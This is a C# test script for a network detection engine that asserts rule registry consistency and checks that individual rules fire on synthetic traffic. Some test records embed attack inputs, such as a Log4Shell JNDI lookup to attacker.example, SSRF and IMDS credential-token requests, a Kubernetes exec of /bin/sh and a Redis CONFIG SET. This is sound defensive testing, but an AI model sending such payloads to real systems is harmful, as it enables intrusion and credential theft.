using System;
using System.Linq;
using Carthago.Engine.Rules;
using Carthago.Engine.Rules.Catalog;
using Carthago.Engine.Rules.Health;
using Carthago.Models;
using Carthago.Services;
using Carthago.Services.EnvironmentTuning;
using Carthago.Sinks;
using Carthago.Services.Diagnostics;
using Carthago.Services.Feedback;
using Carthago.Services.Baseline;
using Carthago.Services.RuleTuning;
using Carthago.Services.Benchmarking;

using Carthago.Services.EntityGraph;
using Carthago.Services.Triage;
using Carthago.Services.InvestigationCopilot;
using Carthago.Services.Response;
using Carthago.Services.Timeline;
using Carthago.Engine.ContentPacks;
using Carthago.Interop.Sigma;
using Carthago.Interop.Suricata;
using Carthago.Interop.Zeek;
using Carthago.Services.Sensors;
using Carthago.Services.Hunting;
using Carthago.Tests.Benchmark;
using Carthago.Services.ViewModels;
using Carthago.Analytics.Models;
using Carthago.Tests;

static void Assert(bool condition, string message)
{
    if (!condition) throw new InvalidOperationException(message);
}

var registry = RuleRegistry.CreateDefaultRules();
var descriptors = RuleCatalog.All;

Assert(registry.Count == descriptors.Count, "RuleRegistry and RuleCatalog count mismatch.");
Assert(!RuleCatalog.Validate().Any(), string.Join(Environment.NewLine, RuleCatalog.Validate()));
Assert(descriptors.Select(d => d.RuleId).Distinct(StringComparer.OrdinalIgnoreCase).Count() == descriptors.Count, "Duplicate RuleId found.");
Assert(descriptors.Select(d => d.ConfigKey).Distinct(StringComparer.OrdinalIgnoreCase).Count() == descriptors.Count, "Duplicate ConfigKey found.");

Assert(registry.All(r => r.Intelligence != null), "Every rule must expose RuleIntelligence.");
Assert(registry.All(r => string.Equals(r.Intelligence.RuleId, r.Descriptor.RuleId, StringComparison.OrdinalIgnoreCase)), "RuleIntelligence.RuleId must match Descriptor.RuleId.");
Assert(registry.All(r => r.Intelligence.Revision >= 1), "Every rule revision must be >= 1.");
Assert(registry.All(r => r.Intelligence.TelemetryRequirements.Count > 0), "Every rule must have telemetry requirements.");
Assert(registry.All(r => !string.IsNullOrWhiteSpace(r.Intelligence.InvestigationHint)), "Every rule must have investigation guidance.");
Assert(registry.Any(r => r.Intelligence.AttackTechniqueIds.Contains("T1071.004")), "DNS/C2 rules should map to MITRE ATT&CK T1071.004.");


for (var i = 1; i <= 49; i++)
{
    var id = $"R{i:000}";
    Assert(descriptors.Any(d => d.RuleId == id), $"Missing preserved rule {id}.");
    Assert(registry.Any(r => r.Descriptor.RuleId == id), $"Preserved rule {id} is not registered.");
}

for (var i = 50; i <= 56; i++)
{
    var id = $"R{i:000}";
    Assert(descriptors.Any(d => d.RuleId == id && d.EnabledByDefault), $"Health rule {id} must be implemented and enabled by default.");
}

for (var i = 57; i <= 544; i++)
{
    var id = $"R{i:000}";
    var descriptor = descriptors.SingleOrDefault(d => d.RuleId == id);
    Assert(descriptor != null, $"Missing concrete extended rule {id}.");
    Assert(!descriptor!.IsPlanned, $"{id} must be a concrete telemetry rule, not a planned placeholder.");
    Assert(descriptor.EnabledByDefault, $"{id} concrete rule should be enabled by default unless explicitly disabled by config.");
}

Assert(registry.All(r => r is IDetectionRule), "Every registered rule must implement IDetectionRule.");
Assert(new SinkManagerOptions().DropCurrentOnOverflow == false, "SinkManager must not drop confirmed detections on overflow by default.");

var telemetryValidation = RuleTelemetryValidator.Validate(registry.Single(r => r.Descriptor.RuleId == "R084"), new TrafficRecord
{
    Source = "10.0.0.1",
    Destination = "198.51.100.1",
    Protocol = "HTTP",
    HttpUri = "/?x=test"
});
Assert(telemetryValidation.CanRunSafely, "R084 telemetry validation should pass with HTTP URI evidence.");

var missingTelemetryValidation = RuleTelemetryValidator.Validate(registry.Single(r => r.Descriptor.RuleId == "R102"), new TrafficRecord
{
    Source = "10.0.0.1",
    Destination = "8.8.8.8"
});
Assert(!missingTelemetryValidation.CanRunSafely, "R102 telemetry validation should require DNS metadata.");

var tlsPortOnlyValidation = RuleTelemetryValidator.Validate(registry.Single(r => r.Descriptor.RuleId == "R138"), new TrafficRecord
{
    Source = "10.0.0.1",
    Destination = "203.0.113.10",
    Protocol = "TCP",
    DestinationPort = 443
});
Assert(!tlsPortOnlyValidation.CanRunSafely, "R138 TLS-family rules must not run safely from TCP/443 alone.");

var kubernetesPortOnlyValidation = RuleTelemetryValidator.Validate(registry.Single(r => r.Descriptor.RuleId == "R293"), new TrafficRecord
{
    Source = "10.0.0.10",
    Destination = "203.0.113.20",
    Protocol = "TCP",
    DestinationPort = 6443
});
Assert(!kubernetesPortOnlyValidation.CanRunSafely, "R293 Kubernetes rules must require Kubernetes audit/context fields, not only API-server port.");

var weakHighCandidate = new DetectionEvent
{
    RuleId = "R413",
    RuleName = "weak high candidate",
    Severity = SeverityLevel.High,
    Evidence = "matched_text=admin; port=443",
    ConfidenceScore = 0.90,
    ConfidenceLabel = DetectionConfidenceLabel.High
};
var weakPrecisionDecision = RulePrecisionRuntimeEvaluator.Evaluate(
    descriptors.Single(d => d.RuleId == "R413"),
    weakHighCandidate,
    new TrafficRecord
    {
        Source = "10.0.0.5",
        Destination = "203.0.113.44",
        Protocol = "TCP",
        DestinationPort = 443,
        Info = "admin"
    },
    RuleMode.Alert,
    "SmallBusiness");
Assert(weakPrecisionDecision.EffectiveMode != RuleMode.Alert, "Weak text/port-only high candidate must be downgraded by runtime precision gate.");


var configPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "carthago-rules-mode-" + Guid.NewGuid().ToString("N") + ".json");
await System.IO.File.WriteAllTextAsync(configPath, """
{
  "Version": 3,
  "Profile": "SmallBusiness",
  "Rules": {
    "R084": { "Enabled": true, "Mode": "Shadow" },
    "R085": { "Enabled": false },
    "R086": { "Enabled": true, "Mode": "Alert" }
  }
}
""");
RuleEngine.LoadConfig(configPath);
Assert(RuleEngine.GetRuleMode("R084", true) == RuleMode.Shadow, "Shadow mode config failed.");
Assert(RuleEngine.GetRuleMode("R085", true) == RuleMode.Disabled, "Disabled mode config failed.");
Assert(RuleEngine.GetRuleMode("R086", true) == RuleMode.Alert, "Alert mode config failed.");
RuleEngine.LoadConfig("rules.json");



// Concrete extended rule smoke tests: these prove R057+ are real telemetry rules, not descriptors only.
var log4ShellRule = registry.Single(r => r.Descriptor.RuleId == "R084");
var log4ShellResult = await log4ShellRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.25",
    Destination = "198.51.100.10",
    Protocol = "HTTP",
    DestinationPort = 80,
    HttpMethod = "GET",
    HttpUri = "/search?q=${jndi:ldap://attacker.example/a}",
    HttpUserAgent = "curl/8"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(log4ShellResult.Matched && log4ShellResult.Events.Any(e => e.RuleId == "R084"), "R084 must emit a real DetectionEvent for Log4Shell/JNDI telemetry.");
var log4ShellEvent = log4ShellResult.Events.Single(e => e.RuleId == "R084");
Assert(log4ShellEvent.ConfidenceScore > 0 && log4ShellEvent.ConfidenceLabel != DetectionConfidenceLabel.Unknown, "R084 event must carry confidence.");
Assert(log4ShellEvent.StructuredEvidence != null && log4ShellEvent.StructuredEvidence.Items.Count > 0, "R084 event must carry structured evidence.");
Assert(log4ShellEvent.RuleRevisionAtDetection >= 1 && !string.IsNullOrWhiteSpace(log4ShellEvent.RuleMaturityAtDetection), "R084 event must snapshot rule maturity/revision.");

var dnsTunnelRule = registry.Single(r => r.Descriptor.RuleId == "R102");
var longLabel = new string('a', 55) + ".exfil.example";
var dnsTunnelResult = await dnsTunnelRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.26",
    Destination = "8.8.8.8",
    Protocol = "DNS",
    DestinationPort = 53,
    DnsQname = longLabel,
    DnsQtype = "A"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(dnsTunnelResult.Matched && dnsTunnelResult.Events.Any(e => e.RuleId == "R102"), "R102 must emit a real DetectionEvent for DNS tunneling long-label telemetry.");

var mqttRule = registry.Single(r => r.Descriptor.RuleId == "R113");
var mqttResult = await mqttRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.30",
    Destination = "203.0.113.40",
    Protocol = "TCP",
    DestinationPort = 1883,
    ApplicationProtocol = "MQTT",
    Info = "MQTT CONNECT clientId=sensor-1"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(mqttResult.Matched && mqttResult.Events.Any(e => e.RuleId == "R113"), "R113 must emit a real DetectionEvent for external MQTT broker telemetry.");



// R123_R544 expansion smoke tests: selected best-fit rules must be concrete telemetry rules.
var ssrfRule = registry.Single(r => r.Descriptor.RuleId == "R163");
var ssrfResult = await ssrfRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.40",
    Destination = "198.51.100.20",
    Protocol = "HTTP",
    DestinationPort = 80,
    HttpMethod = "GET",
    HttpUri = "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(ssrfResult.Matched && ssrfResult.Events.Any(e => e.RuleId == "R163"), "R163 must emit for SSRF metadata service telemetry.");

var axfrRule = registry.Single(r => r.Descriptor.RuleId == "R182");
var axfrResult = await axfrRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.41",
    Destination = "8.8.8.8",
    Protocol = "DNS",
    DestinationPort = 53,
    DnsQname = "example.com",
    DnsQtype = "AXFR"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(axfrResult.Matched && axfrResult.Events.Any(e => e.RuleId == "R182"), "R182 must emit for DNS AXFR telemetry.");

var slackRule = registry.Single(r => r.Descriptor.RuleId == "R217");
var slackResult = await slackRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.42",
    Destination = "198.51.100.42",
    Protocol = "HTTP",
    DestinationPort = 443,
    HttpMethod = "POST",
    HttpHost = "hooks.slack.com",
    HttpUri = "/services/T000/B000/secret"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(slackResult.Matched && slackResult.Events.Any(e => e.RuleId == "R217"), "R217 must emit for Slack webhook egress telemetry.");

var modbusWriteRule = registry.Single(r => r.Descriptor.RuleId == "R240");
var modbusWriteResult = await modbusWriteRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.43",
    Destination = "10.20.0.10",
    Protocol = "TCP",
    DestinationPort = 502,
    Info = "Modbus function 16 write multiple registers"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(modbusWriteResult.Matched && modbusWriteResult.Events.Any(e => e.RuleId == "R240"), "R240 must emit for Modbus write telemetry.");

var torRule = registry.Single(r => r.Descriptor.RuleId == "R264");
var torResult = await torRule.EvaluateAsync(new RuleEvaluationContext(new TrafficRecord
{
    Source = "10.0.0.44",
    Destination = "185.220.101.1",
    Protocol = "TCP",
    DestinationPort = 9001,
    Sni = "directory.torproject.org"
}, Sensitivity.Balanced, DateTime.UtcNow));
Assert(torResult.Matched && torResult.Events.Any(e => e.RuleId == "R264"), "R264 must emit for Tor directory/guard telemetry.");



// R273-R544 v8 expansion smoke tests: selected best-fit rules must be concrete telemetry rules.
async Task AssertRuleMatches(string ruleId, TrafficRecord record, string message)
{
    var rule = registry.Single(r => r.Descriptor.RuleId == ruleId);
    var result = await rule.EvaluateAsync(new RuleEvaluationContext(record, Sensitivity.Balanced, DateTime.UtcNow));
    Assert(result.Matched && result.Events.Any(e => e.RuleId == ruleId), message);
}

await AssertRuleMatches("R275", new TrafficRecord { Source = "10.0.0.60", Destination = "198.51.100.60", Protocol = "HTTP", DestinationPort = 443, HttpMethod = "POST", HttpHost = "login.microsoftonline.com", HttpUri = "/oauth2/v2.0/devicecode?client_id=x&device_code=y&user_code=z" }, "R275 must emit for OAuth device-code phishing telemetry.");
await AssertRuleMatches("R295", new TrafficRecord { Source = "10.0.0.61", Destination = "10.10.0.10", Protocol = "HTTP", DestinationPort = 6443, HttpMethod = "POST", HttpUri = "/api/v1/namespaces/default/pods/web/exec?command=/bin/sh&container=web" }, "R295 must emit for Kubernetes pod exec API telemetry.");
await AssertRuleMatches("R356", new TrafficRecord { Source = "10.0.0.62", Destination = "10.10.0.20", Protocol = "HTTP", DestinationPort = 8080, HttpMethod = "GET", HttpUri = "/crumbIssuer/api/json", HttpHost = "jenkins.local" }, "R356 must emit for Jenkins crumb issuer enumeration telemetry.");
await AssertRuleMatches("R384", new TrafficRecord { Source = "10.0.0.63", Destination = "169.254.169.254", Protocol = "HTTP", DestinationPort = 80, HttpMethod = "GET", HttpRequestHeaders = "Metadata:true", HttpUri = "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" }, "R384 must emit for Azure IMDS token request telemetry.");
await AssertRuleMatches("R393", new TrafficRecord { Source = "10.0.0.64", Destination = "203.0.113.64", Protocol = "HTTP", DestinationPort = 80, HttpMethod = "GET", HttpUri = "/jquery-3.3.1.min.js", HttpUserAgent = "Mozilla/5.0" }, "R393 must emit for Cobalt Strike-like beacon URI telemetry.");
await AssertRuleMatches("R437", new TrafficRecord { Source = "10.0.0.65", Destination = "10.10.0.65", Protocol = "TCP", DestinationPort = 6379, Info = "Redis CONFIG SET dir /tmp" }, "R437 must emit for Redis CONFIG SET telemetry.");
await AssertRuleMatches("R485", new TrafficRecord { Source = "10.0.0.66", Destination = "10.20.0.66", Protocol = "UDP", DestinationPort = 47808, Info = "BACnet WriteProperty request object=analogOutput" }, "R485 must emit for BACnet WriteProperty telemetry.");
await AssertRuleMatches("R508", new TrafficRecord { Source = "10.0.0.67", Destination = "198.51.100.67", Protocol = "HTTP", DestinationPort = 443, HttpUserAgent = "rclone/v1.66.0", HttpHost = "storage.example.net" }, "R508 must emit for rclone egress telemetry.");
await AssertRuleMatches("R516", new TrafficRecord { Source = "10.0.0.68", Destination = "198.51.100.68", Protocol = "TCP", DestinationPort = 443, ProcessName = "cloudflared", Sni = "trycloudflare.com" }, "R516 must emit for Cloudflared tunnel telemetry.");
await AssertRuleMatches("R531", new TrafficRecord { Source = "carthago-sensor-1", Destination = "local", Protocol = "Health", Info = "journal disk space low no space left" }, "R531 must emit for detection journal disk-space health telemetry.");

var evt = new DetectionEvent
{
    RuleId = "TEST",
    RuleName = "Journal test",
    TimestampUtc = DateTime.UtcNow,
    SourceIp = "127.0.0.1",
    DestinationIp = "127.0.0.1",
    Protocol = "test",
    Summary = "Journal roundtrip test",
    Severity = SeverityLevel.Info
};

var tempRoot = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "carthago-rule-tests-" + Guid.NewGuid().ToString("N"));
var journal = new DetectionJournal(new DetectionJournalOptions { DirectoryPath = tempRoot, FlushAfterEveryWrite = true });
var write = await journal.AppendAsync(evt);
Assert(write.Succeeded, "Journal write failed in test.");
var reader = new DetectionJournalReader(new DetectionJournalOptions { DirectoryPath = tempRoot });
var readBack = new System.Collections.Generic.List<DetectionEvent>();
await foreach (var item in reader.ReadDayAsync(DateTime.UtcNow)) readBack.Add(item);
Assert(readBack.Any(e => e.EventId == evt.EventId && e.RuleId == "TEST"), "Journal read-back failed.");
Assert(readBack.Any(e => e.EventId == evt.EventId && e.DeliveryStatus == DetectionDeliveryStatus.Persisted), "Journal must persist DeliveryStatus=Persisted.");
Assert(readBack.Any(e => e.EventId == evt.EventId && e.PersistedAtUtc.HasValue && !string.IsNullOrWhiteSpace(e.JournalPath)), "Journal metadata was not persisted.");

var outbox = new DetectionOutbox(new DetectionOutboxOptions { DirectoryPath = System.IO.Path.Combine(tempRoot, "outbox"), FlushAfterEveryWrite = true });
var outboxWrite = await outbox.AppendPendingAsync(evt, "FailingTestSink", "synthetic sink failure");
Assert(outboxWrite.Succeeded && !string.IsNullOrWhiteSpace(outboxWrite.OutboxPath), "Outbox write failed in test.");
Assert(System.IO.File.Exists(outboxWrite.OutboxPath), "Outbox JSONL file was not created.");

var dnsLabelThreshold = RuleEngine.GetRuleIntSetting("R102", "Threshold", 50, 1, 4096);
Assert(dnsLabelThreshold == 50, "Default per-rule threshold accessor should return supplied default when no override exists.");


var baselineDir = System.IO.Path.Combine(tempRoot, "baseline");
var baseline = new BaselineStore(new BaselineOptions { DirectoryPath = baselineDir });
var firstBaseline = await baseline.ObserveAsync(new BaselineObservation("host", "network", "10.0.0.99", DateTime.UtcNow, "test"));
var secondBaseline = await baseline.ObserveAsync(new BaselineObservation("host", "network", "10.0.0.99", DateTime.UtcNow, "test"));
Assert(firstBaseline.IsFirstSeen && secondBaseline.IsKnown && !secondBaseline.IsFirstSeen, "Baseline first/known decision failed.");

var feedbackStore = new DetectionFeedbackStore(new DetectionFeedbackOptions { DirectoryPath = System.IO.Path.Combine(tempRoot, "feedback") });
await feedbackStore.AppendAsync(new DetectionFeedback { EventId = evt.EventId, RuleId = evt.RuleId, Verdict = DetectionFeedbackVerdict.FalsePositive, Note = "test feedback" });
var feedbackCount = 0;
await foreach (var feedback in feedbackStore.ReadAllAsync()) if (feedback.EventId == evt.EventId) feedbackCount++;
Assert(feedbackCount == 1, "Feedback persistence failed.");

var ruleHealth = new RuleHealthDiagnosticsService().Snapshot();
Assert(ruleHealth.Count == registry.Count && ruleHealth.Any(x => x.RuleId == "R084"), "Rule health diagnostics snapshot failed.");

var structuredValidation = RuleCatalog.ValidateStructured();
Assert(!structuredValidation.HasCriticalErrors, "Structured catalog validation must not report critical errors: " + string.Join("; ", structuredValidation.CriticalErrors.Select(e => e.Message).Take(10)));
Assert(new RuleCatalogValidator().Validate(new IDetectionRule[] { new SyntheticRule("R900", "Rules.R900.Enabled"), new SyntheticRule("R900", "Rules.R901.Enabled") }).HasCriticalErrors, "Structured validator must detect duplicate RuleId values.");
var duplicateConfigValidation = new RuleCatalogValidator().Validate(new IDetectionRule[] { new SyntheticRule("R901", "Rules.Duplicate.Enabled"), new SyntheticRule("R902", "Rules.Duplicate.Enabled") });
Assert(duplicateConfigValidation.HasCriticalErrors, "Structured validator must detect duplicate ConfigKey values.");
Assert(duplicateConfigValidation.Errors.Any(f => f.IsCritical) && duplicateConfigValidation.Findings.Any(f => f.RuleId == "R901" && f.Code == "DUPLICATE_CONFIG_KEY") && duplicateConfigValidation.Findings.Any(f => f.RuleId == "R902" && f.Code == "DUPLICATE_CONFIG_KEY"), "Duplicate ConfigKey findings must be visible in global and per-rule health views.");
var missingPrecisionValidation = new RuleCatalogValidator().Validate(new IDetectionRule[] { new SyntheticRule("R903", "Rules.R903.Enabled", attachPrecisionProfile: false) });
Assert(missingPrecisionValidation.Findings.Any(f => f.Code == "MISSING_PRECISION_PROFILE"), "Structured validator must warn when RuleIntelligence lacks an explicit precision profile.");
var qualityScore = new RuleQualityScorer().Score(registry.Single(r => r.Descriptor.RuleId == "R102"), structuredValidation, RuleRuntimeStatsStore.Snapshot("R102"));
Assert(qualityScore.TotalScore >= 0 && qualityScore.TotalScore <= 100 && qualityScore.DimensionScores.Count >= 6, "Rule quality score must produce bounded dimension scores.");
RuleRuntimeStatsStore.Reset();
RuleRuntimeStatsStore.RecordResult("R900", RuleEvaluationResult.NoMatch("R900"), DateTime.UtcNow, TimeSpan.FromMilliseconds(1), missingTelemetry: true);
RuleRuntimeStatsStore.RecordResult("R900", RuleEvaluationResult.Match("R900", new DetectionEvent { RuleId = "R900", RuleName = "Synthetic", Summary = "Synthetic" }), DateTime.UtcNow, TimeSpan.FromMilliseconds(2));
RuleRuntimeStatsStore.RecordResult("R900", RuleEvaluationResult.SuppressedMatch("R900"), DateTime.UtcNow, TimeSpan.FromMilliseconds(1), cooldownHit: true);
RuleRuntimeStatsStore.RecordResult("R900", RuleEvaluationResult.FailedRule("R900", "synthetic failure"), DateTime.UtcNow, TimeSpan.FromMilliseconds(1));
var runtimeStats = RuleRuntimeStatsStore.Snapshot("R900");
Assert(runtimeStats.Evaluations == 4 && runtimeStats.Matches == 2 && runtimeStats.NoMatches == 1 && runtimeStats.Suppressed == 1 && runtimeStats.Failed == 1, "RuleRuntimeStatsStore must count Match, NoMatch, Suppressed, and Failed outcomes.");
Assert(runtimeStats.MissingTelemetryCount == 1 && runtimeStats.CooldownHitCount == 1 && runtimeStats.AverageDurationMicroseconds > 0, "RuleRuntimeStatsStore must count missing telemetry, cooldown, and duration.");
RuleNoMatchReasonStore.Reset();
var explicitNoMatch = RuleEvaluationResult.NoMatch("R900", RuleNoMatchReasonCategory.MissingTelemetry, "MISSING_DNS", "DNS qname is required for this synthetic rule.");
Assert(explicitNoMatch.NoMatchReasons.Count == 1 && explicitNoMatch.NoMatchReasons[0].Category == RuleNoMatchReasonCategory.MissingTelemetry, "RuleEvaluationResult.NoMatch must carry structured no-match reasons.");
RuleNoMatchReasonStore.RecordFromResult("R900", explicitNoMatch, DateTime.UtcNow);
RuleNoMatchReasonStore.Record("R900", RuleNoMatchReasonCategory.BelowThreshold, "BELOW_THRESHOLD", "Synthetic count below threshold.", DateTime.UtcNow);
var noMatchStats = RuleNoMatchReasonStore.Snapshot("R900");
Assert(noMatchStats.TotalNoMatches == 2 && noMatchStats.MissingTelemetryCount == 1 && noMatchStats.DominantReason != null, "RuleNoMatchReasonStore must aggregate no-match reasons by rule.");
var tuningInsight = new RuleTuningInsightService().Build(
    new SyntheticRule("R900", "Rules.R900.Enabled"),
    runtimeStats,
    noMatchStats,
    new RuleTelemetryCoverageImpact("R900", RuleTelemetryCoverageState.Unsupported, new[] { RuleTelemetryKind.Dns }, Array.Empty<RuleTelemetryKind>(), new[] { RuleTelemetryKind.Dns }, new[] { "dns_qname" }, null),
    RuleMode.Alert);
Assert(tuningInsight.Recommendations.Any(r => r.Code == "ADD_REQUIRED_TELEMETRY"), "RuleTuningInsightService must recommend telemetry fixes when no-match reasons show missing telemetry.");
var healthSnapshots = new RuleHealthSnapshotService().Snapshot();
Assert(healthSnapshots.Count == registry.Count && healthSnapshots.Any(s => s.RuleId == "R102" && s.QualityScore.TotalScore >= 0), "RuleHealthSnapshotService must expose UI-ready rule health snapshots.");
var syntheticHealth = new RuleHealthSnapshotService(ruleProvider: () => new IDetectionRule[] { new SyntheticRule("R900", "Rules.R900.Enabled") }).Snapshot().Single();
Assert(syntheticHealth.NoMatchStats.TotalNoMatches == 2 && syntheticHealth.TuningInsight.Recommendations.Any(), "Rule health snapshots must include no-match stats and tuning insight.");

RuleSuppressionPolicyStore.Current.Clear();
RuleSuppressionAuditStore.Reset();
var suppressionPolicy = RuleSuppressionPolicyStore.Current.AddOrReplace(new RuleSuppressionPolicy(
    PolicyId: "test-r900-destination",
    RuleId: "R900",
    Scope: RuleSuppressionScope.DestinationIp,
    MatchValue: "203.0.113.42",
    Action: RuleSuppressionAction.Suppress,
    Reason: "Synthetic approved destination during test.",
    CreatedBy: "architecture-test",
    TicketReference: "TEST-900"));
var suppressionDescriptor = new RuleDescriptor("R900", "Synthetic", "Test", "Synthetic rule", SeverityLevel.Medium, "Rules.R900.Enabled", true);
var suppressionRecord = new TrafficRecord
{
    Source = "10.0.0.44",
    Destination = "203.0.113.42",
    DestinationPort = 443,
    Protocol = "TCP"
};
var suppressionEvent = new DetectionEvent
{
    RuleId = "R900",
    RuleName = "Synthetic",
    SourceIp = "10.0.0.44",
    DestinationIp = "203.0.113.42",
    DestinationPort = 443,
    Protocol = "TCP",
    Summary = "Synthetic suppression test"
};
var suppressionDecision = new RuleSuppressionPolicyEvaluator().Evaluate(suppressionEvent, suppressionRecord, suppressionDescriptor, DateTime.UtcNow);
Assert(suppressionDecision.Matched && suppressionDecision.Action == RuleSuppressionAction.Suppress && suppressionDecision.PolicyId == suppressionPolicy.PolicyId, "Rule suppression policy evaluator must match scoped destination policy.");
RuleSuppressionAuditStore.Record(suppressionDecision, DateTime.UtcNow);
var suppressionStats = RuleSuppressionAuditStore.Snapshot("R900");
Assert(suppressionStats.TotalPolicyMatches == 1 && suppressionStats.SuppressedByPolicy == 1 && suppressionStats.ActivePolicyCount == 1, "RuleSuppressionAuditStore must aggregate explicit suppression decisions.");
var suppressionHealth = new RuleHealthSnapshotService(ruleProvider: () => new IDetectionRule[] { new SyntheticRule("R900", "Rules.R900.Enabled") }).Snapshot().Single();
Assert(suppressionHealth.SuppressionPolicyStats.TotalPolicyMatches == 1 && suppressionHealth.ActiveSuppressionPolicies.Count == 1, "Rule health snapshots must include suppression policy stats and active policies.");
var suppressionTuningInsight = new RuleTuningInsightService().Build(
    new SyntheticRule("R900", "Rules.R900.Enabled"),
    runtimeStats,
    noMatchStats,
    new RuleTelemetryCoverageImpact("R900", RuleTelemetryCoverageState.Full, Array.Empty<RuleTelemetryKind>(), Array.Empty<RuleTelemetryKind>(), Array.Empty<RuleTelemetryKind>(), Array.Empty<string>(), null),
    RuleMode.Alert);
Assert(suppressionTuningInsight.Recommendations.Any(r => r.Code == "REVIEW_EXPLICIT_SUPPRESSION_POLICY"), "Tuning insight must expose explicit suppression policy impact.");
var invalidCidrStore = new RuleSuppressionPolicyStore();
invalidCidrStore.AddOrReplace(new RuleSuppressionPolicy("bad-cidr", "R900", RuleSuppressionScope.SourceIp, "10.0.0.0/99", RuleSuppressionAction.Suppress, "invalid prefix should not throw"));
var invalidCidrDecision = new RuleSuppressionPolicyEvaluator(invalidCidrStore).Evaluate(suppressionEvent, suppressionRecord, suppressionDescriptor, DateTime.UtcNow);
Assert(!invalidCidrDecision.Matched, "Invalid CIDR suppression policies must fail closed without throwing or matching.");
RuleSuppressionPolicyStore.Current.Clear();
RuleSuppressionAuditStore.Reset();

var boundary = NetworkBoundaryProfile.DefaultLocal();
Assert(boundary.ClassifyAddress("10.10.10.5").Zone == NetworkBoundaryZone.Internal, "RFC1918 address should classify as internal.");
Assert(boundary.ClassifyAddress("8.8.8.8").Zone == NetworkBoundaryZone.External, "Public address should classify as external.");

var tunedBoundary = NetworkBoundaryProfile.DefaultLocal() with
{
    ApprovedExternalDestinations = new[] { "8.8.8.8", "*.trusted.example" },
    ManagementCidrs = new[] { "10.0.99.0/24" }
};
var envService = new EnvironmentAssessmentService(tunedBoundary, new AssetProfileCatalog(new ApprovedAssetRegistry(new EnvironmentTuningOptions
{
    Approved = new ApprovedEnvironmentOptions
    {
        AdminHosts = { "10.0.99.10" },
        DnsResolvers = { "8.8.8.8" }
    }
})));
var envAssessment = envService.Assess(new TrafficRecord
{
    Source = "10.0.99.10",
    Destination = "8.8.8.8",
    Protocol = "DNS",
    DestinationPort = 53,
    DnsQname = "example.com"
});
Assert(envAssessment.SourceBoundary.Zone == NetworkBoundaryZone.Management && envAssessment.DestinationBoundary.Zone == NetworkBoundaryZone.External, "Environment assessment should classify management-to-external DNS flow.");
Assert(envAssessment.SourceAsset.Role == AssetRole.AdminHost && envAssessment.IsBoundaryCrossing && envAssessment.IsApprovedDestination, "Environment assessment should include asset role, boundary crossing, and approved destination status.");

RuleTelemetryCoverageStore.Reset();
var coverageRecord = new TrafficRecord
{
    Source = "10.0.0.50",
    Destination = "8.8.8.8",
    Protocol = "DNS",
    DestinationPort = 53,
    DnsQname = "longlabel.example",
    DnsQtype = "A"
};
RuleTelemetryCoverageStore.ObserveRecord(coverageRecord, DateTime.UtcNow);
var coverageSnapshot = new RuleTelemetryCoverageService(() => registry).Snapshot();
var dnsCoverage = coverageSnapshot.RuleImpacts.Single(x => x.RuleId == "R102");
Assert(coverageSnapshot.RecordsObserved == 1 && coverageSnapshot.AvailableKinds.Contains(RuleTelemetryKind.Dns), "Telemetry coverage store should observe DNS telemetry.");
Assert(dnsCoverage.State is RuleTelemetryCoverageState.Full or RuleTelemetryCoverageState.Partial, "R102 telemetry coverage should become at least partial after a DNS observation.");
var healthSnapshotWithCoverage = new RuleHealthSnapshotService(ruleProvider: () => registry).Snapshot().Single(s => s.RuleId == "R102");
Assert(healthSnapshotWithCoverage.TelemetryCoverage.State is RuleTelemetryCoverageState.Full or RuleTelemetryCoverageState.Partial, "Rule health snapshot should include telemetry coverage impact.");

var enrichedEvent = new DetectionEvent { RuleId = "R102", RuleName = "DNS Tunneling", Summary = "test", Evidence = "dns_qname=longlabel.example" };
DetectionEvidenceEnricher.ApplyEnvironmentAndTelemetryEvidence(enrichedEvent, registry.Single(r => r.Descriptor.RuleId == "R102").Descriptor, coverageRecord, envAssessment);
Assert(enrichedEvent.StructuredEvidence != null && enrichedEvent.StructuredEvidence.Items.Any(i => i.Key == "source.zone") && enrichedEvent.StructuredEvidence.Items.Any(i => i.Key == "telemetry.coverage_state"), "Detection evidence enrichment should add environment and telemetry evidence.");

var replayErrors = await RuleReplayTestHarness.RunDirectoryAsync(System.IO.Path.Combine("Tests", "RuleReplaySamples"));
Assert(!replayErrors.Any(), "Replay harness failed: " + string.Join("; ", replayErrors.Take(10)));

var precisionReplayRunner = new Carthago.Services.Benchmarking.RuleReplayRunner();
var precisionReplaySample = new Carthago.Services.Benchmarking.RuleReplaySample
{
    Name = "architecture-log4shell-engine-replay",
    Classification = Carthago.Services.Benchmarking.ReplaySampleClassification.Malicious,
    Records =
    {
        new TrafficRecord
        {
            Source = "10.0.0.25",
            Destination = "198.51.100.10",
            Protocol = "HTTP",
            DestinationPort = 80,
            HttpMethod = "GET",
            HttpUri = "/search?q=${jndi:ldap://attacker.example/a}",
            HttpUserAgent = "curl/8"
        }
    },
    ExpectedMatches = { "R084" },
    Assertions =
    {
        new Carthago.Services.Benchmarking.RuleReplaySampleAssertion
        {
            RuleId = "R084",
            MustMatch = true,
            MinimumConfidence = 0.01
        }
    }
};
var precisionReplayResult = await precisionReplayRunner.RunSampleAsync(precisionReplaySample, new Carthago.Services.Benchmarking.RuleReplayRunOptions
{
    TreatUnexpectedMatchesAsFailure = false,
    TreatBenignEmissionsAsFailure = false
});
Assert(precisionReplayResult.Passed && precisionReplayResult.MatchedRuleIds.Contains("R084"), "RuleReplayRunner must assert expected engine-level matches.");
